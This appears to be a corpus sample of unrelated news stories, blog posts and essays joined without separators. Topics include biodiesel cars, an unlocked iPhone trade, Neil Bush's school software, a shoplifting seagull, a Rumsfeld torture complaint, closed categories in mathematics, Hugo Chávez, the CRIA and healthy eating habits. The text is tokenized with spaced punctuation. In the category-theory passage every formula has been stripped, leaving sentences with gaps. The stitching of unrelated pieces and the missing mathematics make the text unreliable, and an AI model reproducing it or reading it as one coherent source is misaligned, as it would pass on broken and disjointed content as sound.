The gold luxury coupe has tinted windows to give it a " gangsta " look , Brooks said .
Her Chevy
Tahoe demonstrates that it 's possible to drive a jumbo SUV without fouling the air .
And with an increasing number of filling stations in Southern California selling biodiesel , motorists do n't have to go too far out of their way to feed their green machines .
A Los Angeles architect who got his 1980 Mercedes coupe from Biobling boasted that he has n't bought gasoline in nearly a year .
Though he spends about $ 3.29 per gallon for biodiesel , Warren Wagner said he did n't mind paying more for fuel that 's produced domestically .
" I 'm not supporting big oil , " Wagner said .
" When I 'm driving it around , my car is an ambassador for alternative transportation . "
I wonder where they think the gasoline and diesel that the soybean farmers use comes from .
How was the biodiesel transported to the filling station ?
Where did the plastics and rubber in all of those vehicles came from ?
Where did the methanol come from that is used to make the biodiesel ?
Biodiesel is certainly better than corn ethanol in this respect , but do n't kid yourself that you are n't using oil or polluting if you are using biodiesel .
So , while I applaud the effort , I think a better recognition of the actual embedded fossil fuels might lead to more informed decisions about which actions are more environmentally responsible .
When the oil starts to run scarce , some people are going to have a rude awakening to the fact they are far more dependent upon oil than they think .
This article provides a perfect example of people who suffer from such fossil fuel delusions , and it is the same kind of delusional thinking displayed by our political leaders .
" Renewable fuels " with heavy fossil fuel inputs are not truly renewable , nor are they non-polluting .
I can't help but be reminded of the article I read regarding the Hummer owner who was " kicking the oil habit " because his Hummer ran on E85 .
A Prius running on 100 % fossil fuels is going to have a lower fossil fuel footprint than a Chevy Tahoe running on biodiesel or a Hummer running on ethanol .
A Prius running on biodiesel ( or green diesel ) ; well that 's potentially a different matter .
* For the purposes of this essay , I shall not discuss the possible energy footprint of that sprawling property .
I will presume it is not powered by coal .
A New Jersey teenager has cut a deal to trade a hacked iPhone for a new set of wheels and three further iPhones , Yahoo ! reports .
Seventeen - year - old George Hotz , of Glen Rock , made the announcement on his blog , having successfully unlocked the Jesus phone .
Duly released from the shackles of AT&T , the device was then swiftly offered for sale .
Hotz said : " Terry Daidone , the founder of Certicell contacted me this morning , and offered to make a trade for the iPhone .
I traded it for a sweet Nissan 350Z and 3 8GB iPhones . "
He described the trade as " a great end to a great summer " , and he can only hope AT&T 's attack lawyers do n't provoke a sudden autumn chill .
Daidone , who 's the co-founder of Louisville , Kentucky - based CertiCell , has apparently also offered the young man a paid consulting job , but stresses the company does n't have " any plans on the table right now to commercialize Mr. Hotz ' discovery " . ®
" The biggest threat to science , " writes Jennifer Washburn , is " the decline of government support ... and the growing dominance of private spending over American research . "
In 1965 , the U.S. government funded more than 60 percent of research , while in 2006 , 65 percent of research was privately funded .
Even some industry leaders are concerned that basic research , which " drives innovation 10 to 15 years out , " is being shortchanged in favor of applied research focused on marketable products .
Multiple analyses have shown " that the effect of industry funding on the research outcome is huge " -- a particularly troubling phenomenon for medical research .
" Big Pharma now finances approximately 70 percent of the nation 's clinical drug research , " and of that , " an estimated 75 percent flows to for - profit contract research firms .
...
In 2001 , the editors of 12 leading medical journals ... expressed their shock at what was happening to independent scientific inquiry . "
Government research is increasingly privatized to firms like Sciences International , while " most of these federal agencies lack even the most rudimentary tools that a medical journal editor would use to assess the quality and scientific integrity of industry - funded research . "
Watchdog asks :
Why is Bush 's kid brother getting federal bucks ?

An independent watchdog agency has asked the Department of Education to investigate why President Bush 's younger brother , Neil , has received money earmarked for the president 's signature education initiative to sell a curriculum program that has not been subjected to the rigorous evaluation it deserves .
Neil Bush , 52 , who has no background in education , founded Ignite !
Learning in 1999 with donations from his parents and a slate of international business interests .
The company produces " Curriculum on Wheels " devices -- computer / projectors that are pre-loaded with software aimed at preparing students for standardized tests that are the central tenet of the president 's No Child Left Behind law .
The " COWs " are sold to school districts at a cost of $ 3,800 to $ 4,200 , although they have not been subjected to peer - reviewed scientific studies , according to Citizens for Responsibility and Ethics in Washington .
CREW says nearly $ 1 million has been spent on the systems in 16 school districts , mostly in Texas , where George W. Bush served as governor before his election in 2000 , and Florida , where brother Jeb Bush is governor .
The watchdog group is requesting an investigation from the Education Department 's inspector general , alleging that the Ignite !
systems do not meet the standards laid out by Congress dictating how NCLB funds can be spent .
" It is astonishing that taxpayer dollars are being spent on unproven educational products to the financial benefit of the presidents brother , " Melanie Sloan , CREW 's executive director , said in a news release .
" The IG should investigate whether childrens educations are being sacrificed so that Neil Bush can rake in federal funds . "
Neil Bush first attracted public scrutiny for his role in the Savings and Loan scandals of the late 1980s when a Colorado S&L on whose board he served failed .
The scandal cost taxpayers $ 1.6 billion .
Some school districts identified by CREW spent hundreds of thousands of dollars in federal money on the mobile projectors , which include curriculum for math , science or social studies .
In addition to their baseline cost -- $ 3,800 for a single - subject COW or $ 4,200 for one covering all three subjects -- the units impose on schools a $ 1,000 annual licensing and upkeep fee , CREW says .
Schools also have the option of purchasing lifetime contracts for $ 6,800 , according to the New York Times .
Although there 's no direct evidence of presidential nepotism on behalf of his baby brother , Neil Bush did benefit from his mother 's largesse in the wake of Hurricane Katrina last year .
Barbara Bush donated an undisclosed amount of money to a hurricane relief fund overseen by former Presidents George H. W. Bush and Bill Clinton , and earmarked part of those funds for purchases of Ignite !
software .
In an interview earlier this year with the New York Times , Neil Bush denied using his brother 's position to push his product .
He claimed he was inspired to start the company after struggling with dyslexia while he was in school .
Ignite 's
Web site includes anecdotal testimonials from teachers who have used the program .
But some teachers are less than impressed with the system , saying it supplants rote memorization for critical thinking skills .
" As a review , it uses catchy phrases and tunes , " Jeremy Siefker , a middle school science teacher who 's used the program , told the Times , " but as far as scientific investigation and inquiry , I do n't think it 's very good . "
Ironically , among the schools that have shunned the program is a Texas elementary school named for Neil Bush 's father .
" After reviewing the program , Bush is not interested , " Jill Arthur , principal of George H. W. Bush Elementary in Midland , TX , wrote in an e-mail to Ignite !
obtained by CREW .
" We feel our money is best spent elsewhere . "
The seagull has been nicknamed Sam by locals
Shoplifting seagull
The bird walks into the RS McColl newsagents in Aberdeen when the door is open and makes off with cheese Doritos .
The seagull , nicknamed Sam , has now become so popular that locals have started paying for his crisps .
Shop assistant Sriaram Nagarajan said : " Everyone is amazed by the seagull .
For some reason he only takes that one particular kind of crisps . "
The bird first swooped in Aberdeen 's Castlegate earlier this month and made off with the 55 p crisps , and is now a regular .
Once outside , the crisps are ripped open and the seagull is joined by other birds .
' Fine art '
Mr Nagarajan said : " He 's got it down to a fine art .
He waits until there are no customers around and I 'm standing behind the till , then he raids the place .
" At first I did n't believe a seagull was capable of stealing crisps .
But I saw it with my own eyes and I was surprised .
He 's very good at it .
The seagull takes the crisps outside and eats them
" He 's becoming a bit of a celebrity .
Seagulls are usually not that popular but Sam is a star because he 's so funny . "
A spokesman for RSPB Scotland said : " I 've never heard of anything like this before .
" Perhaps it tried some crisps in a shiny packet in the street , and was just opportunistic one day at the shop when it saw what was inside .
" As everyone knows , gulls can be very quick and fearless , and clearly this one is no exception . "
He added : " We 'd discourage people from feeding gulls though , as gulls in towns generate lots of complaints every year , and the availability of food is the only reason they live in urban settings . "
Rumsfeld hit with torture lawsuit while visiting Paris Jason Rhyne
Published : Friday October 26 , 2007

Print This Email This Former US Secretary of Defense Donald Rumsfeld 's jaunt to France was interrupted today by an unscheduled itinerary item -- he was slapped with a criminal complaint charging him with torture .
Rumsfeld , in Paris for a discussion sponsored by the magazine Foreign Policy , was tracked down by representatives of a coalition of international human rights groups , who informed the architect of the US invasion of Iraq that they had submitted a torture suit against him in French court .
The filed documents allege that during his tenure , the former defense secretary " ordered and authorized " torture of detainees at both the American - run Abu Ghraib prison in Iraq and the US military 's detainment facility at Guantanamo Bay , Cuba .
The head of one of the groups responsible for bringing the charges , the US - based Center for Constitutional Rights , told RAW STORY today by phone that the suit was a long time coming .
" We 've been working on cornering Rumsfeld and getting him indicted somewhere going on three years now , " said the Center 's president , Michael Ratner .
" Four days ago , we got confidential information he was going to be in France . "
Joined by activists , attorneys for the human rights groups caught up with Rumsfeld on his way to a breakfast meeting .
" He was walking down the street with just one person , " said Ratner .
" Around 20 campaigners gave Rumsfeld a rowdy welcome ... yelling ' murderer , ' waving a banner and trying to push into the building , " reports AFP .
Ratner , who was n't personally at the scene , says his sources told him that the former defense secretary made some pre-scheduled remarks at the meeting before ducking through a door leading to the US Embassy .
According to Ratner , France has a legal responsibility under international law to prosecute Rumsfeld for torture abuses .
" If a torturer comes into your territory , " he said , " there 's an obligation to either prosecute the person or return him to a place where he will be prosecuted . "
The rights groups notably cite three memorandums signed by the defense secretary between October 2002 and April 2003 " legimitizing the use of torture " including the " hooding " of detainees , sleep deprivation and the use of dogs .
Although his group has been a part of previous attempts to bring charges against Rumsfeld , including two former tries in Germany , Ratner believes French court has the highest chance of success .
" There are Guantananamo detainees who were tortured that are living in France , " he said .
" It gives French courts another reason to prosecute . "
Ratner says Europe is " getting very hot for Rumsfeld , " and suggests a French court could at least issue its version of a subpoena .
" We hope that this case will move forward , " he said , " especially as the US says it can continue to torture people . "
Other groups involved in the complaint include the International Federation of Human Rights , the French League for Human Rights and Germany 's European Center for Constitutional and Human Rights .
More details about the lawsuit are available at the website of the Center for Constitutional Rights .

Closed Categories
A closed category is a symmetric monoidal category where each functor has a specified right adjoint called an “ exponential ” : .
By what we said yesterday , this means that there is a unique way to sew all these adjoints parametrized by together into a functor .
The canonical example of such a category is the category of sets with the cartesian product as its monoidal structure .
For each set we need an adjunction .
That is , functions taking a pair of elements — one from and one from — to an element of should be in bijection with functions from to .
And indeed we have such an adjunction : is the set of all functions from to .
Let ’s say this a bit more concretely .
If we consider the set of natural numbers we have the function , which takes two numbers and gives back a third : if we stick in and we get back .
But what if we just stick in the first number of the pair ?
Then what we get back is a function that will take the second number and give us the sum : if we just feed in we get back the function .
That is , we can see addition either as a function taking a pair of numbers to a number , or we can see it as a function , taking a number to a function from numbers to numbers .
More generally , if we can define , which is defined by .
That is , takes an element of and gives back a function from to .
We call this process of turning functions of many variables into functions of a single variable at a time “ currying ” , after Haskell Curry .
It turns out to be phenomenally useful for discussing theories of computation , and forms part of the basis of functional programming .
Closed categories are an attempt to mirror this currying procedure in other categories .
In general , if the monoidal structure in question is the categorical product ( which is always symmetric ) then we say the category is “ cartesian closed ” .
Most such categories still look a lot like this example in sets , with morphisms given by functions preserving structure and the exponential given by an appropriate analogue of the functor .
Here ’s an example , though , of a cartesian closed category that looks rather different .
It requires the notion of a “ predicate calculus ” , but not very much of it .
Basically , if you have a rough idea of what such a thing is you ’ll be fine .
Okay , there ’s a category whose objects are well - formed formulas in the calculus , and whose arrows are proofs .
The product in this category is , read “ and ” .
If we know then we can derive and we can derive , so there are two arrows .
On the other hand , if implies both and , then implies .
This is just a rough sketch that is the categorical product , but it ’s good enough for now .
Anyhow , the exponential is , read “ implies ” .
This is subtler than it seems .
In the last paragraph I was saying things like “ implies “ , but this is not what I mean here .
The formula is the statement within the calculus that there exists a proof starting from and ending with .
Writing out “ implies ” as I ’m discussing the structure is a high - level view from outside the system .
Writing in the structure itself is a low - level view , “ internal ” to the category .
“ implies ” is a statement about the category , while “ ” is a statement within the category .
Now if implies we have ( by definition ) a proof starting from and ending with .
Then we can use this proof to devise a proof starting from and ending with .
That is , implies if and only if implies .
This shows that is right adjoint to , as we claimed .

Some motorists may be too big for their cars .
The growing girth of Americans is colliding with government - mandated warning labels on all 2006 or newer cars that list the maximum weight — passengers and cargo — that 's safe to carry .
Many two - seat sports cars , including Mazda MX - 5 Miata and Chevrolet ( GM ) Corvette , are n't certified to carry two 200 - pound adults , according to a government formula aimed at tire safety .
Many five - passenger vehicles are rated about 850 pounds , maxxing out if their five occupants weigh more than 170 pounds each .
Six 200 - pounders would overload the seven - passenger Dodge Grand Caravan minivan .
The limitations are stamped on a " Tire and Loading Information " plate on the driver 's side door frame .
The ratings are an outgrowth of the 2000 Firestone tire recall , in which overloading was considered a factor that could cause tires to fail .
Weight limits are important because automakers could claim they do n't have responsibility for a component failure or a crash if a vehicle is overloaded .
Automakers say the limits reflect a mandated federal formula that requires them to rate passengers at 150 pounds each .
The limit may not be realistic " given American propensity for food , but that is the regulation , " says Mazda safety director Dan Ryan .
The National Highway Traffic Safety Administration says automakers can set the weight limit at whatever they deem appropriate .
In 2004 , the Centers for Disease Control pegged average weights at 190 pounds for men , 163 for women .
David Champion , Consumer Reports head of auto testing , says automakers are n't building cars that can stand up to loads of bigger passengers .
A family car " should be capable of carrying five reasonably sized people , not five midgets . "
At 265 pounds , Ron Larson of Henderson , Nev. , says he and his 150 - pound wife were unaware of the limitations two years ago when they leased a Cadillac XLR two - seater with a 362 - pound capacity .
" If the dealership knew there was a weight restriction , they should have told us , " he says .
And the information should be on the window sticker , not the door frame , he says .
The XLR can carry more , but has n't been certified for it , says Terry Connolly , GM energy and drive quality director .
" When we put a label on a vehicle , we need to be conservative . "
Honda ( HMC ) spokesman Sage Marie says that beyond the 400 - pound weight limit in the S2000 two - seater , " We ca n't be responsible for the vehicle 's dynamic characteristics , " although an undisclosed safety margin is built in .

President Hugo Chávez has announced that foreigners who visit Venezuela and criticise his government will be escorted to the airport and expelled .
In a televised address the Venezuelan leader ordered cabinet ministers to monitor statements by visitors and deport them if they " denigrated " his leadership .
" How long are we going to allow a person - from any country in the world - to come to our own house to say there 's a dictatorship here , that the president is a tyrant , and nobody does anything about it ? " he said .
" No foreigner , whoever he may be , can come here and attack us .
Whoever comes , we must remove him from the country .
Here is your bag , sir , go . "
The threat , made during a six - hour broadcast on Sunday , is one of the strongest warnings to foreign critics since Mr Chávez was elected eight years ago .
It came on the eve of the publication of a draft constitution that will propose abolishing presidential term limits , allowing the socialist leader to stand again when his current term ends in 2012 .
He has recently signalled an acceleration of his self - described revolution by ordering the armed services to reflect socialist values and telling education officials to purge the " perversity of capitalism " from school textbooks .
Opinions about the politician , an outspoken opponent of US foreign policy and a key ally of Cuba , are sharply divided at home and abroad .
Supporters say he is a democrat who has won three landslides , poured his country 's oil wealth into social programmes for the poor and restored dignity to Latin America by standing up to Washington .
Opinion polls put his approval ratings well above 60 % .
Critics say he is wasting billions on unsustainable populist schemes and eroding democracy by bringing the courts , parliament , the armed services and the state media under his direct control .
In May the government refused to renew the terrestrial broadcast licence of RCTV , an opposition - aligned TV station , provoking accusations of censorship .
Sunday 's attack will further polarise the president 's reputation .
He did not name any critics but the immediate target was believed to be Manuel Espino , the head of Mexico 's conservative ruling party , who on a recent visit to Caracas questioned the president 's democratic credentials .
Mr Chávez said he personally did not mind criticism but that in some cases it affronted " national dignity " .
Hours after his speech the information ministry issued a press release quoting the remarks .
It was headlined : " Foreigners who come to Venezuela to denigrate it must be deported . "
Some analysts played down the warning .
" I still subscribe to the view that what appears to be wrong with Chávez is more bark than bite , " said Larry Birns , of the Washington - based thinktank , the Council on Hemispheric Affairs .
" Venezuela is not moving towards an authoritarian regime .
It 's just that when he speaks Chávez does n't have a pause button .
These sort of remarks cause enormous misapprehension and misunderstanding but do n't really represent his convictions . "
One western diplomat said Sunday 's speech did not signal a crackdown on dissent but did reflect a worrying drift .
" One should n't overreact , it does n't change much right now , but it is part of a general trend towards intolerance of criticism . "
Foreign journalists and NGOs operate freely in Venezuela and about 80 % of the domestic media is in private hands .
Mr Chávez 's supporters say he has behaved with remarkable restraint given that much of the private media openly backed a coup which briefly ousted him in 2002 .
But the climate is changing .

( These comments are directed toward members of Burning Man's LLC .
The word " you " refers to " the Org " throughout .
Be advised that this is the fourth time I 've scratched everything I 've written and started over on this .
It may be kinda wordy .
Coffee and a smoke would be good about now . )
+++++++++++++
I 've been watching this topic pretty closely these last few days , and have spent far more time doing so than I 'll care to admit .
This year will be my fifth burn .
I began going to the event in 2001 , and though I 've missed a couple years in between , the Playa is never far from my thoughts .
I 'll spare the details of my life - changing experience ; others have told far better stories than I , and the only reason I even mention this is to give you an idea of where I 'm coming from in regards to the Burn .
The idea of commercial ventures on the Playa , as represented by the worst - case nightmare of what we fear the Pavilion might be , is pretty much universally revolting , and would likely spell the end of the event , at least for a large number of us .
However , the Pavilion is receiving plenty of attention in other threads at the moment .
My comments and questions are directed instead toward the Business 2.0 article in itself , and in particular within that , the comments of both Larry Harvey and Marion Goodell .
One can make the observation that many of the quotes in the article read like a journalistic hack - job , that you were so painfully misquoted by the article 's author as to make you appear disdainful of the people that attend the very event you operate .
This , however , does n't ring true , for a couple of reasons : first , you can't totally control the media , but you have a long history of being able to at least steer them in directions you 'd like them to go .
You 've been able to keep a surprisingly tight rein on the press , and have made it clear that the Org makes the rules in that relationship .
Therefore , there must have been at least a minimal vetting process in the production of this article .
Secondly , if the author was indeed some sort of charlatan out to ruin the event , it seems there would have been some response to the contrary from those so quoted .
Instead , in spite of some pretty venomous furor , we have heard nothing from the top .
Andie 's comments here and on Tribe are helpful and appreciated ( at least by me ) , but do n't carry quite the same weight as the person who actually tossed out the offending soundbite .
So , after all this buildup , I suppose what I 'd really like to know is :
Were the quotes in the Business 2.0 article an actual indication of how you feel about us as a community ?
If not , then why has there been no response from the higher management to the contrary ?
I realize the people here , and over on Tribe , are giving you guys a hammering on this .
Please understand -- it all comes outta the love , baby .
If we did n't care so much , we would n't bitch nearly as loud .
I also realize you have absolutely no obligation to respond to this ; however , I think it would go a very long way toward salvaging some good will on this issue .
So if you 'd like to respond , that would be peachy .
Otherwise , we can all just rip this apart on the board and put it back together into something more ( or less ? ) coherent .
Either way 's good by me .
I 'll be there regardless , at least this year .
+++++++++++++
As a final Postscript ... if the Org has indeed made a response somewhere that I have n't stumbled across yet , someone please delete this so I do n't look like an even bigger ass than I already am .
Thanks ...
As Rudolph W. Giuliani campaigns around the country highlighting his stewardship of New York City after the Sept. 11 attacks , he is widely hailed for bringing order to a traumatized city .
But he has also raised the hackles of rescue and recovery workers by likening his experience to theirs .
On at least three occasions , in responding to accusations that the city failed to adequately protect the health of workers in the wreckage , he has boasted that he faced comparable risks himself .
In one appearance he declared that he had been in the ruins “ as often , if not more ” than the cleanup workers who logged hundreds of hours in the smoldering pile .
Another time he brushed aside safety claims by asserting that his long hours at the site had left him susceptible to “ every health consequence that people have suffered . ”
So , how much time did Mayor Giuliani spend at ground zero ?
A complete record of Mr. Giuliani ’s exposure to the site is not available for the chaotic six days after the attack , when he was a frequent visitor .
But an exhaustively detailed account from his mayoral archive , revised after the events to account for last - minute changes on scheduled stops , does exist for the period of Sept. 17 to Dec. 16 , 2001 .
It shows he was there for a total of 29 hours in those three months , often for short periods or to visit locations adjacent to the rubble .
In that same period , many rescue and recovery workers put in daily 12 - hour shifts .
In the aftermath of the recent demonoid turmoil , " A former music buyer " posted an open letter to the CRIA - an impressive summary of what 's wrong with the music industry and how they alienate their customers .
The RIAA and the CRIA have to rethink their business models , closing down p2 p sites does not solve the problem .
To Whom It May Concern at the CRIA :
I have been an avid music collector for many years , and have approximately 1000 CD ’s in my collection , not counting albums that I have purchased over the internet and own only digital copies of .
I purchase approximately 30 - 40 new CDs per year .
However , thanks to your recent decision to block Canadian users from accessing Demonoid , I have decided that I cannot continue to support this backwards , dysfunctional industry with my money any longer , and as such , I do not plan on purchasing music ever again if it means that one penny goes to your organization .
I listen to heavy metal music , a form of music that “ the industry ” stopped supporting many years ago , so I have a hard time feeling any sympathy .
Sites such as Demonoid have done far more to promote the music I love than your organization or the industry in general has ever done .
I can find out about new artists and new releases from artists that are never promoted .
I can listen to music from artists that have never been played on the radio , will never be shown on MuchMusic or MTV , and never have a review or even mention of their new album written about in the local newspaper .
From listening to this music , I can make an informed decision if I wish to purchase the album or not , as I am not going to gamble $ 15 - 20 on something that I have n’t heard anything off of before .
25 years ago , I primarily learned about music from friends who dubbed a copy onto a cassette tape , where I could listen to it and make a decision if I wanted to buy the tape for myself .
Now , many years removed from school , my “ gang ” of friends to share music with has shifted from cassette tapes and the school cafeteria to sharing mp3 ’s online .
I listen to some things that I do n’t like , and consequently , I do n’t buy those albums .
What I do like , I buy , or at least I used to , before your decision intended to stop me from hearing new music .
The industry cries that record sales are down , and blames this all on internet downloading .
I wo n’t be so naÃ¯ve as to say that internet downloading has no impact on the sales .
Downloading has certainly stopped me from making the stupid purchases where I heard one single that I liked and bought an entire album only to find out that the rest of the songs are crap , and the CD sits collecting dust on my shelf .
But for every CD that I did n’t buy based on those premises , there are 2 or 3 other CDs that I did buy because I heard of them for the first time on a site like Demonoid .
In the meantime , the music industry itself needs to recognize that they are to blame for sagging record sales .
For years , they have been marketing recycled crap , and people are getting tired of it .
On the odd occasion that something fresh and new accidentally slips through and gets radio play , the music industry immediately signs a seemingly infinite number of clone bands that makes the “ new , fresh ” sound boring almost instantly .
It seems the music industry does n’t even care about making or promoting good music any more .
Instead , they market a young , pretty face that can dance provocatively and lip - synch well , and push this on the radio stations to play while getting the tabloids to print large pictures of their breasts .
If bands like AC / DC or Motorhead were to emerge today , they would never be successful ; not because of poor record sales due to downloading , but due to the fact that they ’re ugly so the record company would n’t promote them , if they picked them up at all .
In the meantime , they ’re falling all over themselves to promote Britney Spears , Lindsay Lohan , or any teenage tramp that can be airbrushed to look sexy .
The record labels cry about downloading cutting into the profits of the sales of albums .
They put out “ greatest hits ” albums by 20 - year olds with 2 or 3 albums under their belts , released with one new track to try and sucker the fans that already have both albums into spending another $ 20 for one new song , or re-releasing a 3 - month old album with a “ previously unreleased bonus track ” .
Then they ca n’t understand why people are n’t buying them , and cry foul that people are downloading the one new song instead .
I know not only the record companies are crying .
Artists that have been around long enough to have enough clout to get a cut of the record sales are concerned about their cut , like Metallica that also clamor that “ downloading is evil ” , and then go on to sell over 9 million copies of their last album instead of 9.1 million .
Boo hoo .
Meanwhile , many younger , smaller artists favor downloading , because they know it ’s the only way that people will get to hear the music and in turn come out to see their shows , because the record label sure as hell is n’t promoting them .
But they ca n’t say that out loud , can they ?
If they do , guess which band is going to get dropped by the label ?
So tell me , what does the CRIA do to promote metal ?
Oh , right , you ’ve got a link to the top 50 “ metal ” albums in Canada , which after a quick glance at the top ten this week includes punk acts like Dropkick Murphys , Finger Eleven , and Billy Talent , and rock acts like Nickelback and Queen , but very little that resembles heavy metal .
( Perhaps you should ask the Celtic punk band , Dropkick Murphys , what they think of being labeled as “ metal ” . )
And also tell me , without Demonoid , where would I have found out about bands like Evile or Dublin Death Patrol and made a decision to purchase their album online ( because no record store that I have found in Canada carries either one ) .
And god forbid the CRIA would care about the promotion of Canadian talent , such as longtime recording artist Annihilator , which released one of the better albums of 2007 .
However , I have yet to see their new album sold in any store in Canada , including HMV ’s flagship store on Yonge Street in Toronto , and I ultimately had to buy a copy from a UK website .
Considering the only place I had heard about this album was having downloaded it from Demonoid , do you really expect anyone to make this kind of effort to buy an album without ever having heard it ?
The record labels and CRIA have gone to great lengths to tell us that downloading and sharing music is killing the music industry .
Open your eyes and you will see that the music industry dinosaur has already been killing itself for years , and by resisting technology rather than embracing it and using it to their advantage .
“ Oh , but they have , ” you try to insist , pointing to the sites devoted to selling music in mp3 format online .
I notice that most of the metal bands I am interested in are still not available through these services .
I also notice that buying an entire album ends up costing as much , if not more , than if I went to buy it in the store , even though there are no longer costs of materials or shipping that have to be paid for , and once again , I fail to come up with any sympathy for the music industry .
I hope the music industry does die , because I know that music itself will not die so with the corrupt aspects of the industry gone , only then might music once again flourish .
Sincerely ,
A former music buyer
But the leaders of several such organizations , including the American Heart Association , the American Diabetes Association and the Alzheimers Association , said they applauded the campaign ’s message that progress against chronic disease would be halting until the country fixed its health care system .
As in the past , the heart association is using its advertising dollars these days to promote more rigorous exercise and healthier diets .
The most recent cancer society campaign encouraged screening for colon cancer , including a memorable commercial in which a diner plucked — and then ate — a lima bean polyp from the intestinal tract he had carved in his mashed potatoes .
But John R. Seffrin , the chief executive of the cancer society , which is based here , said his organization had concluded that advances in prevention and research would have little lasting impact if Americans could not afford cancer screening and treatment .
“ I believe , if we do n’t fix the health care system , that lack of access will be a bigger cancer killer than tobacco , ” Mr. Seffrin said in an interview .
“ The ultimate control of cancer is as much a public policy issue as it is a medical and scientific issue . ”
The two 60 - second television commercials that form the spine of the campaign make that point .
One features images of uninsured cancer patients , appearing hollow and fearful .
“ This is what a health care crisis looks like to the American Cancer Society , ” the narrator begins .
“ We ’re making progress , but it ’s not enough if people do n’t have access to the care that could save their lives . ”
Oh come on , what the hell is that ?
A Nokia branded iPhone ?
It was presented during Nokia 's GoPlay event this morning as a glimpse into the future of Nokia interface design .
Oh , and it 's due out next year .
When pressed during the Q&A about the striking similarity to the little Cupertino device , Anssi Vanjoki -- Nokia 's Executive VP & General Manager of Multimedia -- said , " If there is something good in the world then we copy with pride . "
Well , ok then .
See what we mean after the break .

If you 've vacationed in an international destination , you know that learning about its food is one of the best ways to become familiar with a new culture .
But lately , Americans have also taken greater interest in global cuisine because of health benefits attributed to certain styles of eating .
Three servings or more a day of produce can lower the risk of stroke , heart disease , and some cancers .
Books , such as " The French Diet : The Secrets of Why French Women Don't Get Fat , " by Michel Montignac , and ongoing nutrition studies of the so - called Mediterranean diet and Asian foods continue to garner new headlines .
We 've sifted through the research to offer the following eating and meal - planning tips .
Making small changes in the way you eat can bring big health benefits -- and more enjoyment -- to your table .
Healthy Habit 1 : Eat plenty of produce and whole grains
Countries known for putting it into practice : China and Greece
In many countries , meat is a garnish .
The traditional Chinese diet , for example , consists primarily of vegetables , fruits , and whole grains .
And in Greece , " vegetables and legumes are main meals , not just side dishes , " says Antonia Trichopoulou , M.D. , Ph.D. , professor at the University of Athens Medical School and director of the World Health Organization 's Collaborating Center of Nutrition .
Research finds that three servings or more a day of produce can lower the risk of stroke , heart disease , and some cancers .
Harvard University 's Nurses Health Study , for example , which examined almost 85,000 women over 12 to 14 years , found that those who ate the most fruit and vegetables had a 20 percent lower risk for heart disease .
USDA diet and nutrition guidelines recommend we eat between five and 13 servings of fruit and vegetables a day , and we 're starting to hear the message .
Today , the average American consumes more than 330 pounds of fresh produce per year , up from 287 pounds in 1990 .
Plus , with the growth of America 's farmers ' markets , the introduction of Consumer Supported Agriculture , where community members buy produce from local farmers each month , and home delivery from many supermarkets , opportunities for Americans to have fresh produce abound .
CookingLight.com : America's healthy living habits
What you can do :
Try to fill two - thirds of your plate with produce and whole - grain foods , and the remaining third with fish or meat , Montignac says .
Also , challenge yourself to put as many colors as possible into your meal .
Or go on a fruit exploration :
Try one new type of fruit from your local market each week .
In summer , freeze some of your new favorites for a frosty after - dinner treat .
Healthy Habit 2 : Savor leisurely dining
Countries known for putting it into practice : Italy , France , Spain , Greece , Japan
A meal in these countries often lasts several hours .
In fact , one of Greece 's dietary guidelines , its version of our USDA dietary guidelines , is to " eat slowly , preferably at regular times of the day , and in a pleasant environment . "
Sharing a meal is so important that Greeks call someone a friend " by saying we have shared bread together , " Trichopoulou says .
For the French , Italians , and Spanish , meals provide quality time with friends and family , a practice that encourages healthful bonds .
Eating comfortably and slowly discourages overeating and fosters relaxation , which aids digestion .
The body processes food more easily and efficiently when it 's calm , Montignac says .
What you can do :
Take time to savor the scent , texture , and flavor of food .
A traditional Japanese tea ceremony , for example , includes a role for each of the senses -- watching and listening as the tea pours from pot to cup , picking up the cup and feeling the heat , smelling , and finally , tasting .
Another way to savor your supper : Divide it into separate courses .
Instead of bringing everything to the table at once , have a salad course , then fruit , entrée , and dessert -- with , say , at least 10 minutes between each course to digest , chat , and relax .
Whether you 're dining with a spouse , family , or just you , set the table and sit down , rather than grazing in the kitchen -- and enjoy .
Healthy Habit 3 : Practice portion control
Countries known for putting it into practice : France , Japan
We have an abundance of delicious and nutritious food available in America ; we just need to pay attention to portions .
An average meal in France is 25 percent smaller than one in America , according to a University of Pennsylvania comparison , which examined portion sizes at 11 similar pairs of establishments , from pizza parlors to ethnic restaurants .
The study also found that a typical carton of yogurt sold in Philadelphia was 82 percent larger than one offered in Paris , and a soft drink was 52 percent larger .
In Japan , foods also come in smaller sizes and are often eaten out of bowls , rather than large plates or platters .
What you can do : Japanese from the Okinawa region , who enjoy the longest life span in the world ( an average of 82 years ) , practice " hara hachi bu , " which translates to " eight parts out of 10 " and means Okinawans stop eating when they are 80 percent full , says Brad Willcox , M.D. , coauthor of the " Okinawa Diet Plan . "
To adopt the concept , set down your fork and remove your plate at the first twinge of fullness , instead of taking a break and eating more .
You can also use smaller plates and bowls when setting the table ; use a food scale to measure portions ; and opt for filling , fiber - rich foods , such as lentils and vegetables .
CookingLight.com : Portion size wise
Healthy Habit 4 : Eat a variety of unprocessed , fresh foods
Countries known for putting it into practice : Italy , France , Greece , Japan , the United States
The first thing many foreign visitors comment on when they enter an American supermarket is how many choices are available .
It 's not uncommon to find wild Alaskan salmon , olive oil from Greece , and grains from Italy all in one store .
Organic foods and farmers ' markets have also never been more popular .
Many of these outlets feature interesting varieties , such as heirloom fruits and vegetables .
Shopping in countries such as France and Italy may also involve several stops -- at the butcher , the greengrocer , and the baker -- which not only increases the shopper 's activity level , but also results in meals made with unprocessed ingredients , Montignac says .
Studies show that fresh foods provide more fiber ; fewer calories , saturated fats , and trans fats ; and less added salt and sugar .
What you can do :
Skip the prepared food aisles at the market and choose fresh , whole foods .
Also , indulge in salads :
With so many fresh vegetables and fruits available , you can put together a big , colorful one in minutes .
Combine baby greens , sliced mushrooms , cherry or sweet grape tomatoes , prechopped fresh bell peppers , and red onions .
Drizzle with a bottled , reduced - calorie vinaigrette , and add whole - grain crackers , melba rounds , or matzoh crackers on the side to sneak in whole grains .
Also , take vegetables beyond salads and steamers by pairing sautéed broccoli or spinach with whole wheat pasta , and tossing with roasted beets and walnuts .

Healthy Habit 5 : Spice up your plate
Countries known for putting it into practice : India , China , Thailand , the United States
Herbs and spices add delicious , attractive , and healthful flair to your plate .
In addition to being low in calories and virtually fat free , researchers are discovering that herbs , such as garlic , thyme , and rosemary , and spices , like cinnamon , cloves , and curcumin ( also known as turmeric ) , may fight disease .
One 40 - day study of 60 people with type - 2 diabetes found that consuming half a teaspoon of cinnamon twice daily significantly lowered subjects ' blood sugar and cholesterol levels .
What you can do :
